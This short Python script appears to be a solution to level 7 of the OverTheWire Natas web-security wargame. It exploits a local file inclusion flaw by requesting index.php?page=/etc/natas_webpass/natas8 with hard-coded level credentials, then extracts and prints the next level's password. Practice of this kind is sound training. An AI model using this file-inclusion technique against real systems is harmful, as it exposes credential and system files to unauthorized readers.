import requests
import re

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
#from the hint we found in source code index page "/etc/natas_webpass/natas8" lets do LOCAL FILE INCLUSION
#therefore replacing index.php?page=howe to index.php?page=/etc/natas_webpass/nata8
url = "http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" % username
response = requests.get(url , auth=(username,password))
flag = response.text
x = re.findall("<br>\n(.*)\n\n<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->",flag)[0]

print(x)